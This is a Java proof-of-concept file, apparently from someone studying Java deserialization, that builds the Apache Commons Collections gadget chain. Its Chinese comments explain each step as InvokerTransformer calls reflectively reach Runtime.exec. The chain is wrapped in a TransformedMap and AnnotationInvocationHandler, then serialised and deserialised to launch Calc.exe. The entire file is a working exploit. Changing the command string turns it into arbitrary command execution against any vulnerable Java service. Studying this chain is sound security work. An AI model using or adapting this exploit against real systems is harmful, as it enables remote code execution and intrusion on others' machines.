import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class poc7 {
    public static void main(String[] args) {
        try {
            Transformer[] transformers = new Transformer[]{
                    // 获得Runtime类对象
                    new ConstantTransformer(Runtime.class),
                    // 传入Runtime类对象 反射执行getMethod获得getRuntime方法
                    new InvokerTransformer(
                            "getMethod",
                            new Class[]{String.class,Class[].class},
                            new Object[]{"getRuntime",null}
                    ),
                    // 传入getRuntime方法对象 反射执行invoke方法 得到Runtime实例
                    new InvokerTransformer("invoke",
                            new Class[] {Object.class, Object[].class },
                            new Object[] {null, null }
                    ),
                    // 传入Runtime实例 执行exec方法
                    new InvokerTransformer("exec",
                            new Class[] {String.class },
                            new Object[] {"Calc.exe"})
            };
//        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            Map innermap = new HashMap();
            innermap.put("value","value");
            Map outermap = TransformedMap.decorate(innermap,null,chainedTransformer);

            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cst = cl.getDeclaredConstructor(Class.class,Map.class);
            cst.setAccessible(true);
            Object exploitObj = cst.newInstance(Target.class,outermap);

            // 序列化
            FileOutputStream fos = new FileOutputStream("object");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(exploitObj);
            oos.close();

            // 反序列化
            FileInputStream fis = new FileInputStream("object");
            ObjectInputStream ois = new ObjectInputStream(fis);
            Object result = ois.readObject();
            ois.close();
            System.out.println(result);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
